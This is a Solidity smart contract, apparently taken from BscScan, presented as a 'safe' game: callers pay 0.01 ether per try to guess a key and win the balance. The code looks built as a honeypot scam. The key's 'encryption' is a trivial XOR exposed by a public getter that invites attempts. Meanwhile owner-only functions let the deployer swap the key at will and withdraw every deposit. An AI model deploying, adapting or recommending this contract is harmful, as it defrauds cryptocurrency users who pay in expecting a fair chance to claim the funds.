/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT

contract Safe {
    address private owner;
    bytes32 private key;
    bytes32 private encryptedOpenSafeKey;
    mapping(address => bool) private unlockedWallets;
    mapping(address => uint256) private lastOpenSafeTimestamps;

    constructor() {
        owner = msg.sender;
        key = keccak256(abi.encode(address(this)));
        encryptedOpenSafeKey = keccak256(abi.encode(key, "0000"));
    }

    event InvalidKeyAttempt(address indexed _sender);

    function openSafe(string memory _key) public payable {
        require(msg.value == 0.01 ether, "0.01 ether required to open safe");
        uint256 lastTimestamp = lastOpenSafeTimestamps[msg.sender];
        require(block.timestamp - lastTimestamp >= 120, "Wait 2 minutes");

        bytes32 decrypted = encryptedOpenSafeKey ^ key;
        string memory keyString = string(abi.encodePacked(decrypted));

        if (keccak256(bytes(_key)) != keccak256(bytes(keyString))) {
            emit InvalidKeyAttempt(msg.sender);
            lastOpenSafeTimestamps[msg.sender] = block.timestamp;
        } else {
            unlockedWallets[msg.sender] = true;
            lastOpenSafeTimestamps[msg.sender] = block.timestamp;
        }
    }

    function claim() public {
        require(unlockedWallets[msg.sender], "Wallet is not unlocked");
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        unlockedWallets[msg.sender] = false;
        delete lastOpenSafeTimestamps[msg.sender];
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setOpenSafeKey(bytes32 _encryptedKey) public {
        require(msg.sender == owner, "Only owner can change openSafeKey");
        encryptedOpenSafeKey = _encryptedKey;
    }

    function getOpenSafeKey() public view returns (string memory) {
        bytes32 decrypted = encryptedOpenSafeKey ^ key;
        return string(abi.encodePacked(decrypted));
    }

    receive() external payable {
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }
}